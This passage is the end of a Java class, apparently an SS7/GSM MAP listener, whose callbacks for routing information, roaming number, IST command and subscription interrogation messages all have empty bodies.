    @Override
    public void onActivateTraceModeResponse_Mobility(
            ActivateTraceModeResponse_Mobility activateTraceModeResponse_mobility) {

    }

    @Override
    public void onSendRoutingInformationRequest(SendRoutingInformationRequest sendRoutingInformationRequest) {

    }

    @Override
    public void onSendRoutingInformationResponse(SendRoutingInformationResponse sendRoutingInformationResponse) {

    }

    @Override
    public void onProvideRoamingNumberRequest(ProvideRoamingNumberRequest provideRoamingNumberRequest) {

    }

    @Override
    public void onProvideRoamingNumberResponse(ProvideRoamingNumberResponse provideRoamingNumberResponse) {

    }

    @Override
    public void onIstCommandRequest(IstCommandRequest istCommandRequest) {

    }

    @Override
    public void onIstCommandResponse(IstCommandResponse istCommandResponse) {

    }

    @Override
    public void onAnyTimeSubscriptionInterrogationRequest(AnyTimeSubscriptionInterrogationRequest arg0) {
        // TODO Auto-generated method stub

    }

    @Override
    public void onAnyTimeSubscriptionInterrogationResponse(AnyTimeSubscriptionInterrogationResponse arg0) {
        // TODO Auto-generated method stub

    }
}
